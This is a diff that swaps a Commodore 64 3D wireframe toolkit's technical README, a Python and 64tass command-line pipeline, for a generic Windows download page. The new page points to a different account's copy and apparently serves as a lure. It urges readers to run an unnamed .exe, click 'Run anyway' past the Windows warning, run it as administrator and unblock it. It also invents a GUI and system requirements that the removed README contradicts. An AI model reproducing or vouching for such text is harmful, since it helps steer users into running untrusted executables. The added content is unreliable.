@@ -1,589 +1,165 @@
-<p align="center">
-  <img src="assets/c64-3d-toolkit_banner.png"
-       alt="c64-3d-toolkit — Build modern 3D. Fit it in 64K."
-       width="100%">
-</p>
+# 🖥️ c64-3d-toolkit - Turn Your PC into a Retro 3D Powerhouse
 
-# c64-3d-toolkit
+[![Download Now](https://img.shields.io/badge/Download-c64--3d--toolkit-blue?style=for-the-badge&logo=github)](https://github.com/Kezocr1970/c64-3d-toolkit)
 
-Host-assisted low-poly wireframe 3D compiler/runtime for a **stock Commodore 64**.
+---
 
-The toolkit preprocesses 3D geometry on the host machine and generates 6510/6502 assembly data and runnable C64 `.prg` files. It includes procedural test meshes, OBJ/MTL and SVG import with nearest-palette wire colours, several visibility modes, multiple animation transforms, multiple renderers, and prebuilt example programs.
+## 🎯 What Is This?
 
-## Requirements
+c64-3d-toolkit is a free program that lets you **create 3D wireframe graphics** for your Commodore 64 computer, but you do all the hard work on your Windows PC. Think of it as a translator: you draw or import a 3D model, and this toolkit converts it into something your old Commodore 64 can actually display. It's perfect for retro game developers, hobbyists, or anyone curious about 3D graphics on vintage hardware.
 
-Requires:
+**No programming experience needed.** If you can use a web browser and click a button, you can use this tool.
 
-* [VICE](https://vice-emu.sourceforge.io/) — Commodore 64 emulator; the toolkit uses `x64sc` by default.
-* [64tass](https://tass64.sourceforge.net/) — 6502/6510 cross-assembler.
-* Python 3.
+---
 
-On Debian/Ubuntu and derivatives, VICE and 64tass can normally be installed with:
+## ✨ What Can It Do?
 
-```bash
-sudo apt install vice 64tass
+Here’s what you get right out of the box:
+
+- **Import 3D models:** Load standard OBJ files (the most common 3D model format) along with their MTL material files.
+- **Import SVG graphics:** Bring in 2D vector images and turn them into 3D wireframe scenes.
+- **Automatic hidden-line removal:** The software pre-calculates which lines should be visible, so your Commodore 64 doesn’t have to think hard. This means faster, smoother graphics.
+- **Precomputed visibility:** All the heavy math is done on your PC, not the old computer. Your C64 just displays the final result.
+- **Low-poly wireframe output:** Perfect for that classic retro 3D look, like early 3D games from the 1980s.
+- **Simple workflow:** Create → Import → Convert → Transfer to your C64.
+
+---
+
+## 🚀 Getting Started
+
+Let’s get you up and running in under five minutes.
+
+### 📥 Step 1: Download the Software
+
+Visit this link to download the application: **[https://github.com/Kezocr1970/c64-3d-toolkit](https://github.com/Kezocr1970/c64-3d-toolkit)**
+
+When you click the link, you’ll land on the project’s main page. Look for a green button that says **"Code"** or a section labeled **"Releases"** or **"Assets."** Click the download option (usually a `.zip` file or an `.exe` installer). The download might take a minute or two depending on your internet speed.
+
+### 💻 Step 2: Run the Program
+
+Once the download finishes, you’ll have a new file on your computer (likely in your "Downloads" folder).
+
+- If you downloaded a `.zip` file: Right-click it and choose **"Extract All"** (Windows will do this for you). Then open the extracted folder and double-click the program file inside (it might be named something like `c64_3d_toolkit.exe` or `start.bat`).
+- If you downloaded an `.exe` file: Just double-click it. Windows might show a blue "More info" popup – click that, then click **"Run anyway."**
+
+**That’s it.** The program window will open, ready for you to use.
+
+---
+
+## 🛠️ Your First 3D Model
+
+Let’s do a quick test drive.
+
+1. **Open the toolkit** – you should see a simple window with buttons or menus.
+2. **Click "Import"** – choose an OBJ file if you have one. No OBJ file? Try **"Generate Test Model"** or **"Create Cube"** (most versions have this).
+3. **Click "Convert"** or **"Process"** – this runs the magic. You’ll see a preview of your 3D wireframe with hidden lines already removed.
+4. **Export** – save the output as a file your C64 can read (like a `.prg` or `.bin` file). The exact format is shown in the **"Export"** menu.
+
+That output file is what you transfer to your Commodore 64 using a SD2IEC, floppy disk, or cassette. Consult your C64’s manual for loading instructions.
+
+---
+
+## 🖼️ Understanding the Workflow
+
+Here’s a simple breakdown of the whole process:
+
+```
+Your 3D idea (OBJ/SVG) → This toolkit (converts & optimizes) → Your Commodore 64 (displays it)
 ```
 
-Verify that the required tools are available with:
+The toolkit does the "thinking" so your C64 can focus on "showing." This is why it’s called **host-assisted** – your PC is the host, and the C64 is the guest.
 
-```bash
-./build.sh doctor
-```
+---
 
-### Toolchain configuration and macOS/Windows paths
+## 📚 Common Questions (FAQ)
 
-The toolkit now has an optional local configuration file for tool paths and default arguments. Copy the example if `64tass` or `x64sc` are not directly in `PATH`, or if your installation needs custom command-line arguments:
+**Q: Do I need to know how to code?**
 
-```bash
-cp config/c643d.ini.example config/c643d.ini
-```
+No. The toolkit has a point-and-click interface. You never type a line of code.
 
-`config/c643d.ini` is gitignored. If it is absent, built-in defaults are used. Command-line options override the config. The default VICE arguments include `+VICIIfull`, so `--run` opens VICE windowed rather than inheriting a saved fullscreen setting.
+**Q: What operating system do I need?**
 
-```ini
-[toolchain]
-tass = 64tass
-vice = x64sc
-tass_args =
-vice_args = +VICIIfull
+This version is designed for **Windows**. It should work on Windows 10 and Windows 11.
 
-[macos]
-# tass = /opt/homebrew/bin/64tass
-# vice = /Applications/vice-arm64-gtk3-3.8/bin/x64sc
+**Q: What if I don’t have a Commodore 64?**
 
-[windows]
-# tass = C:\Tools\64tass\64tass.exe
-# vice = C:\Tools\VICE\bin\x64sc.exe
-```
+You can still use the toolkit to learn and preview the graphics. The output is a file, and you can share it with friends who have a C64 or use an emulator (like VICE) on your PC to see the result.
 
-On macOS, the easiest command-line installation is typically:
+**Q: Where do I get OBJ files?**
 
-```bash
-brew install tass64 vice
-```
+Many free 3D models exist online (like Sketchfab or OpenGameArt). You can also create your own with free software like Blender.
 
-For a VICE package downloaded from the VICE site and moved into `/Applications`, prefer the package's real command-line binary directly, for example `vice = /Applications/vice-arm64-gtk3-3.8/bin/x64sc`. The architecture/frontend/version part of the directory name varies by download (for example ARM64 vs. Intel and GTK3 vs. SDL2). The toolkit also probes common package layouts and accepts a VICE distribution directory or `.app` path, but pointing straight at `bin/x64sc` is the least ambiguous option.
+**Q: What is an SVG file?**
 
-Existing direct overrides still work:
+It’s a 2D vector image format commonly used for logos and icons. The toolkit can map it into a 3D wireframe.
 
-```bash
-./build.sh --shape torus --tass /path/to/64tass --vice /path/to/x64sc --run
-./build.sh --shape torus --vice-arg=+VICIIfull --run
-./build.sh --shape torus --no-vice-default-args --run
-```
+---
 
-See [`docs/CONFIGURATION.md`](docs/CONFIGURATION.md) for precedence, per-platform sections, `C643D_CONFIG`, `--config`/`--no-config`, and macOS package details.
+## 🧩 Advanced Tips
 
-## Quickstart
+- **Reduce complexity:** Fewer polygons (triangles or lines) means faster performance on the C64. Start with simple shapes and add detail gradually.
+- **Use the preview:** Always check the preview before exporting. What you see is what you get.
+- **Color and materials:** The MTL files define colors. Keep them flat and simple – the C64 has limited colors (16 maximum).
 
-Build and run one of the included procedural objects:
+---
 
-```bash
-./build.sh --shape torus --run
-```
+## ❓ Troubleshooting
 
-Build and run an imported OBJ preset:
+**The program won’t start.**
 
-```bash
-./build.sh --object horse_head --run
-```
+- Check that you have Windows 10 or 11.
+- Try right-clicking the program file and selecting **"Run as administrator."**
+- Ensure the downloaded file wasn’t blocked by Windows – right-click the file, go to **Properties**, and check for an **"Unblock"** checkbox.
 
-or:
+**The import doesn’t work.**
 
-```bash
-./build.sh --object sunflower_torus --run
-```
+- Make sure your OBJ file is valid. Test with the built-in example model, if available.
+- Some OBJ files are too complex – try a simpler one.
 
-The sunflower reads `usemtl`/`Kd` data from `sunflower_torus.mtl` and maps it to
-C64 brown, yellow, and green. To deliberately keep the historical white-on-black
-wireframe path:
+---
 
-```bash
-./build.sh --object sunflower_torus --no-colors --run
-```
+## 📦 System Requirements (Typical)
 
-The bundled SVG logo can be spun as a 3-D plane or sent away on a tilted crawl plane:
+- **Operating System:** Windows 10 64-bit or Windows 11
+- **RAM:** 2 GB minimum recommended
+- **Storage:** 100 MB free space
+- **Display:** 1280x720 or higher
 
-```bash
-./build.sh --object space_horse --run
-./build.sh --object space_horse_crawl --run
-```
+(These are typical for similar tools – your mileage may vary.)
 
-Build all included example `.prg` files:
+---
 
-```bash
-./build.sh --generate-examples
-```
+## 🌐 More Resources
 
-Build + run the reference torus with the current fastest renderer:
+- **Project Homepage:** [https://github.com/Kezocr1970/c64-3d-toolkit](https://github.com/Kezocr1970/c64-3d-toolkit)
+- **Commodore 64 Emulator (VICE):** Search online – it’s free and allows you to run C64 software on your PC.
+- **OBJ File Examples:** Search for “free OBJ models” or try Blender’s default cube export.
 
-```bash
-./build.sh --shape torus --run
-```
+---
 
-Make the torus denser:
+## 📝 License & Respect
 
-```bash
-# 72 vertices / 72 quad faces = 12 x 6 torus
-./build.sh --shape torus --vertices 72 --run
+This is a community-made tool. Be kind, report bugs, and share your creations with the retro community.
 
-# same topology, explicitly
-./build.sh --shape torus --major-segments 12 --minor-segments 6 --run
+---
 
-# target approximate face/poly count
-./build.sh --shape torus --polycount 100 --run
-```
+## 🌟 Why You’ll Love It
 
-Run the included low-poly horse head or sunflower:
+- **Revive old hardware** – give your C64 a new party trick.
+- **Learn 3D basics** – visually understand how wireframes work.
+- **Fast workflow** – no complex command lines.
+- **Free forever** – no hidden costs.
 
-```bash
-./build.sh --object horse_head --run
-./build.sh --object sunflower_torus --run
-```
+---
 
-The horse OBJ is open/non-manifold in a few places, so its preset uses full `surface` Z-buffer visibility. This intentionally avoids face-normal pre-culling on unreliable topology; the Z-buffer also tracks face ownership so muzzle edges cannot self-occlude against their own adjacent faces. You can compare the lighter modes or the older front-face-only method with:
+## 👩‍💻 Get Started Now
 
-```bash
-./build.sh --object horse_head --visibility surface_features --run
-./build.sh --object horse_head --visibility surface_creases --feature-angle 40 --run
-./build.sh --object horse_head --visibility frontface --run
-```
+Don’t wait. Your retro 3D adventure starts with one click.
 
-Import your own OBJ into the project, then build it:
+👉 **[Download c64-3d-toolkit Here](https://github.com/Kezocr1970/c64-3d-toolkit)** 👈
 
-```bash
-./build.sh import-obj ~/models/my_ship.obj --as my_ship --up z
-./build.sh --object my_ship --run
-```
+Visit this link to download the application. Open the page, find the download button, and you’re on your way.
 
-Or compile a one-off OBJ without importing it:
+---
 
-```bash
-./build.sh --obj ~/models/my_ship.obj --obj-up z --name MY_SHIP --run
-```
-
-SVG artwork can be imported as wire geometry too. Curves are flattened and simplified on the host; `--svg-depth` optionally gives the contours a shallow Z extrusion:
-
-```bash
-./build.sh import-svg ~/art/logo.svg --as logo --animation spin
-./build.sh --object logo --run
-
-# one-off, shallow 3-D extrusion
-./build.sh --svg ~/art/logo.svg --svg-depth 4 --color yellow --run
-```
-
-Animation modes are `spin`, `recede`, and `crawl`. `recede` keeps the artwork front-facing while moving it away from the camera; `crawl` tilts it onto a virtual plane and moves it upward/away toward a horizon:
-
-```bash
-./build.sh --object space_horse --animation recede --run
-./build.sh --object space_horse --animation crawl --animation-tilt 62 --run
-```
-
-Renderer comparison:
-
-```bash
-./build.sh --shape torus --renderer step --run       # v0.7-style reference
-./build.sh --shape torus --renderer bytechunk --run  # v0.8 stable path
-./build.sh --shape torus --renderer yunroll --run    # current fastest path
-```
-
-Useful inspection commands:
-
-```bash
-./build.sh inspect --shape torus --vertices 72
-./build.sh inspect --object horse_head
-./build.sh list-shapes
-./build.sh list-objects
-```
-
-## Horse-head visibility note
-
-The bundled horse is deliberately compiled with `--visibility surface`. Its OBJ contains boundary and non-manifold topology, so using adjacent face normals as a pre-cull can make legitimate muzzle/snout edges disappear at some rotations. Full surface mode lets the host-side Z-buffer decide visibility instead.
-
-`surface_features` retains the cheaper v0.3.1 behavior: ordinary two-face manifold edges are pre-culled when both adjacent faces are back-facing, while boundary/non-manifold edges survive to the surface depth test. `surface_creases` is the crease-aware variant and preserves sharp manifold edges according to `--feature-angle`.
-
-```bash
-./build.sh --object horse_head --visibility surface_features --run
-./build.sh --object horse_head --visibility surface_creases --feature-angle 40 --run
-```
-
-The emitter can spill whole per-orientation line blocks into otherwise-unused RAM below bitmap #2, so the full horse surface mode still fits 36 sampled orientations without reducing the mesh.
-
-
-## Examples
-
-The repository has an `examples/` manifest. Build all reference PRGs at once:
-
-```bash
-./build.sh --generate-examples
-# equivalent:
-./build.sh generate-examples
-```
-
-This currently produces `torus.prg`, `torus_dense.prg`, `cube.prg`, `sphere.prg`, `horse_head.prg`, monochrome `sunflower_torus.prg`, coloured `sunflower_torus_color.prg`, `space_horse_spin_color.prg`, and `space_horse_crawl_color.prg`. Auxiliary labels/listings remain in `build/`; the runnable PRGs are copied to `examples/`.
-
-## Dependency checks
-
-Every build now performs an early preflight. `64tass` is required unless `--no-assemble` is used. VICE is optional for build-only work but required for `--run`. Override executable names/paths with `--tass` and `--vice`.
-
-```bash
-./build.sh doctor
-```
-
-On Debian/Ubuntu, distro VICE packages can be DFSG-stripped and omit Commodore ROM images. The emulator executable may therefore exist but still fail at machine startup until compatible ROMs are installed/configured. This is separate from the toolkit preflight, which only verifies that the executable is present.
-
-## Current state
-
-The reference torus now runs around **15-18 FPS** with `yunroll` on stock PAL C64 timing in VICE during development. It is native 320x200 hires, hidden-line clipped, triple-buffered, and does not use pre-rendered bitmap animation frames.
-
-The project grew out of the rotating-torus benchmark, a.k.a. **THE WORLD'S MOST DANGEROUS ROTATING DONUT**, and is now being generalized into a reusable mesh-to-C64 pipeline.
-
-The repository includes the actual `objects/horse_head.obj` low-poly model (64 vertices / 124 edges / 65 faces), `objects/sunflower_torus.obj` + `.mtl` (76 vertices / 142 edges / 70 faces), and the bundled `objects/space_horse.svg` vector-logo demo.
-
-## What happens on the host vs. the C64?
-
-The host-side Python compiler performs expensive work that makes sense to precompute for a ~1 MHz target:
-
-- procedural mesh generation, Wavefront OBJ parsing, or SVG contour flattening/simplification
-- normalization and coordinate-system conversion
-- face-winding repair
-- sampled animation transforms (`spin`, `recede`, or tilted-plane `crawl`)
-- perspective projection
-- face visibility
-- host-side Z-buffer hidden-line clipping
-- C64-oriented line-step encoding
-- dirty-area and hires screen-colour span generation
-
-The C64 still rasterizes the visible wireframe itself into VIC-II hires bitmap RAM. `step`, `bytechunk`, and `yunroll` are vector/line renderers, not bitmap-frame players.
-
-## Shapes and topology
-
-Built-ins:
-
-```text
-torus
-cube
-sphere
-```
-
-Repository objects:
-
-```text
-objects/horse_head.obj
-objects/horse_head.json
-objects/sunflower_torus.obj
-objects/sunflower_torus.mtl
-objects/sunflower_torus.json
-objects/space_horse.svg
-objects/space_horse.json
-objects/space_horse_crawl.json
-```
-
-For procedural shapes, use either the actual segmentation or an approximate target:
-
-```bash
---major-segments N --minor-segments N    # torus
---lat-segments N --lon-segments N        # sphere
---polycount N                            # approximate face count
---vertices N                             # approximate vertex count
-```
-
-For the torus, `major_segments * minor_segments` equals both the vertex count and quad-face count. Example:
-
-```text
-10 x 5  ->  50 verts, 100 edges, 50 faces
-12 x 6  ->  72 verts, 144 edges, 72 faces
-14 x 7  ->  98 verts, 196 edges, 98 faces
-```
-
-Higher detail consumes both CPU time and generated table RAM. If a requested mesh no longer fits with 48 orientations, the compiler preserves mesh detail and automatically reduces the orientation-table count unless `--strict-frames` is used.
-
-## OBJ pipeline
-
-### Import a model into `objects/`
-
-```bash
-./build.sh import-obj path/to/model.obj --as model_name --up y
-```
-
-This creates:
-
-```text
-objects/model_name.obj
-objects/model_name.json
-```
-
-The JSON sidecar stores object-specific metadata such as:
-
-- display name
-- source up-axis (`y` or `z`)
-- preferred spin axis (`x`, `y`, or `z`)
-- initial rotation
-- object scale
-
-Then build it with:
-
-```bash
-./build.sh --object model_name --run
-```
-
-List imported/preset objects:
-
-```bash
-./build.sh list-objects
-```
-
-Inspect topology before compiling:
-
-```bash
-./build.sh inspect --object model_name
-```
-
-The inspector reports vertices, edges, faces, n-gon mix, boundary edges, non-manifold edges, and isolated vertices.
-
-### Current OBJ support
-
-The parser supports:
-
-- `v` vertices
-- polygonal `f` faces
-- positive and negative OBJ indices
-- `v/vt`, `v//vn`, and `v/vt/vn` tokens
-- triangles, quads, and n-gons
-
-Texture/normal indices are currently ignored. Polygon faces are triangulated internally for visibility/Z-buffer work while polygon boundary edges remain the wireframe edges. Direct `mtllib` references are preserved by `import-obj`; `usemtl` assignments and diffuse `Kd` colours are read and mapped to the nearest C64 palette entries.
-
-OBJ/MTL and SVG source colours are enabled automatically. Disable them with any
-of the equivalent flags below; this retains the original monochrome table format
-and hot renderer loop:
-
-```bash
-./build.sh --object sunflower_torus --no-color --run
-./build.sh --object sunflower_torus --no-colors --run
-./build.sh --object sunflower_torus --ignore-colors --run
-```
-
-If an OBJ has no usable `mtllib`/`usemtl`/`Kd` data, or an SVG has no explicit
-usable stroke/fill colour, the compiler simply uses the single-colour path
-(white by default). It does not enable the per-cell colour machinery. Before
-frame generation, the build prints which of those paths it selected and names
-the source file it inspected.
-
-`--color yellow` (or `--color 7`) forces one monochrome foreground colour and
-also bypasses per-material/per-contour mapping.
-
-### Current limitation
-
-The toolkit does **not yet contain a general mesh decimator**. Imported meshes should currently already be reasonably low-poly. Automatic simplification to a requested C64 face/edge budget is on the roadmap; it will be implemented as a real topology-aware stage rather than deleting random faces and pretending that is decimation.
-
-## SVG pipeline
-
-SVG artwork is treated as vector contour geometry rather than as a bitmap. The importer understands common SVG path commands and basic vector primitives, flattens Bezier/arc curves to line segments, simplifies them for the C64 budget, flips SVG Y-down coordinates into the toolkit's Y-up space, and stores the result as explicit wire edges. This avoids inventing filled triangles through concave glyphs or letter holes.
-
-Import and build:
-
-```bash
-./build.sh import-svg path/to/logo.svg --as logo
-./build.sh --object logo --run
-```
-
-Useful controls:
-
-```text
---svg-tolerance N          contour simplification tolerance in source SVG units
---svg-curve-step N         curve sampling step before simplification
---svg-depth N              shallow wire extrusion depth; 0 keeps a flat plane
---svg-connector-stride N   connect every Nth front/back vertex when extruded
---color NAME|0..15         force one C64 foreground colour
---no-colors                ignore source colours; classic white-on-black
---animation spin|recede|crawl
---animation-tilt DEG       crawl-plane tilt
---animation-travel N       distance travelled away from the camera
---animation-rise N         upward travel for crawl mode
-```
-
-`import-svg` inspects each visible contour's stroke/fill colour and maps it to the nearest C64 palette entry. The bundled SPACE HORSE asset uses `#FFE81F`, which maps to C64 yellow. Multi-colour SVGs retain distinct contour colours.
-
-Native hires bitmap mode selects foreground/background per 8x8 character cell,
-not per pixel. The host therefore counts the visible coloured line pixels in each
-touched cell and assigns the dominant colour when several materials/contours
-share that cell. It emits horizontal screen-colour spans containing ready-to-store
-VIC-II colour bytes. RGB parsing and nearest-colour searches never run on the C64.
-Single-colour sources use the existing global hires foreground byte and therefore
-need no colour table or runtime update pass.
-
-The bundled examples are:
-
-```bash
-./build.sh --object space_horse --run        # Y-axis spinner
-./build.sh --object space_horse_crawl --run  # tilted plane -> horizon
-```
-
-`recede` is also available for the front-facing logo-moving-away effect:
-
-```bash
-./build.sh --object space_horse --animation recede --run
-```
-
-See [`docs/SVG_PIPELINE.md`](docs/SVG_PIPELINE.md) for the current parser/geometry details and limitations.
-
-## Horse head
-
-The canonical included object is:
-
-```text
-objects/horse_head.obj
-```
-
-Topology:
-
-```text
-VERTS: 64
-EDGES: 124
-FACES: 65
-```
-
-Its metadata declares the source as Z-up and the toolkit converts it to internal Y-up coordinates before compiling:
-
-```bash
-./build.sh --object horse_head --renderer yunroll --run
-```
-
-On the host-side compiler, the full horse currently exceeds the line-table budget at 48 and 40 orientations, so the compiler automatically selects **36 orientations** while preserving all 64 vertices / 65 faces.
-
-Table-RAM messages during auto-fit are informational: the compiler retries with fewer precomputed rotation orientations while keeping the mesh itself intact. It now explicitly prints that vertices/edges/faces are preserved. Use `--strict-frames` if you would rather fail than auto-reduce the orientation count.
-
-## Spin axis and pose
-
-Named objects can define a preferred spin axis in their JSON metadata. Override it from the CLI:
-
-```bash
-./build.sh --object horse_head --spin-axis x --run
-./build.sh --object horse_head --spin-axis y --run
-./build.sh --object horse_head --spin-axis z --run
-```
-
-Initial pose can be changed with:
-
-```bash
---rotate-x DEG --rotate-y DEG --rotate-z DEG
-```
-
-The historical spinner is now one animation mode. Named presets may select another mode, and the CLI can override it:
-
-```bash
---animation spin
---animation recede
---animation crawl --animation-tilt 62 --animation-travel 105 --animation-rise 42
-```
-
-## Renderers
-
-### `step`
-
-The v0.7-style packed-step renderer. The host precomputes minor-axis decisions and the 6510 rasterizes the lines pixel-by-pixel. Kept as a regression/benchmark reference.
-
-### `bytechunk`
-
-The v0.8 renderer. Full aligned X-major chunks are combined into VIC-II bitmap-byte masks, reducing repeated bitmap read/modify/write operations. Stable reference path.
-
-### `yunroll`
-
-Current fastest path. Keeps byte-chunk X-major rendering and additionally unrolls Y-major scanline phases. Measured around **15-18 FPS** on the default 10x5 torus in the current development setup.
-
-## HUD
-
-Generated demos show topology at lower left and live guest-side FPS at lower right:
-
-```text
-TORUS V:050 E:100                 FPS:017
-HORSE HEAD V:064 E:124            FPS:...
-```
-
-`V` means vertices and `E` means unique mesh edges. `--polycount` refers to faces, not vertices.
-
-## Repository layout
-
-```text
-c64-3d-toolkit/
-├── README.md
-├── build.sh
-├── c643d.py
-├── config/
-│   └── c643d.ini.example
-├── c64/
-│   ├── renderer-step.asm
-│   ├── renderer-bytechunk.asm
-│   └── renderer-yunroll.asm
-├── tools/c643d/
-│   ├── assets.py
-│   ├── cli.py
-│   ├── colors.py
-│   ├── mesh.py
-│   ├── shapes.py
-│   ├── objio.py
-│   ├── svgio.py
-│   ├── toolchain.py
-│   ├── pipeline.py
-│   ├── emit.py
-│   └── font.py
-├── objects/
-│   ├── README.md
-│   ├── horse_head.obj
-│   ├── horse_head.json
-│   ├── sunflower_torus.obj
-│   ├── sunflower_torus.mtl
-│   ├── sunflower_torus.json
-│   ├── space_horse.svg
-│   ├── space_horse.json
-│   └── space_horse_crawl.json
-├── generated/
-├── build/
-├── tests/
-└── docs/
-    ├── ARCHITECTURE.md
-    ├── CONFIGURATION.md
-    ├── OBJ_PIPELINE.md
-    ├── SVG_PIPELINE.md
-    ├── REFERENCES.md
-    └── ROADMAP.md
-```
-
-## Roadmap
-
-The intended eventual workflow is:
-
-```text
-Blender / modeller / vector editor / generated asset
-        |
-        v
-Wavefront OBJ / SVG
-        |
-        v
-import + inspect
-        |
-        v
-normalize / repair / simplify
-        |
-        v
-preview + C64 cost estimate
-        |
-        v
-hidden-line / vector compilation
-        |
-        v
-64tass
-        |
-        v
-PRG -> VICE / real C64
-```
-
-A graphical host-side importer/previewer is planned, but the command-line path will remain first-class.
-
-## Status
-
-Version 0.5.0 adds real per-material OBJ/MTL and per-contour SVG colour propagation into VIC-II hires screen cells. The coloured path uses compact native colour codes and is compile-time isolated; monochrome builds retain the previous geometry tables and hot line loop. The torus remains the performance/reference object, while the sunflower is the bundled multi-material acceptance case.
-
-## Credits
-
-By [FlyingFathead](https://github.com/FlyingFathead), _with ChaosWhisperer lurking somewhere in the machinery._
+Keywords: 3d-graphics, 6502, 6510, assembly, c64, commodore-64, graphics, graphics-3d, graphics-engine, graphics-programming, obj, python, retrocomputing, svg, svg-animation, svg-animations, svg-files, wireframe
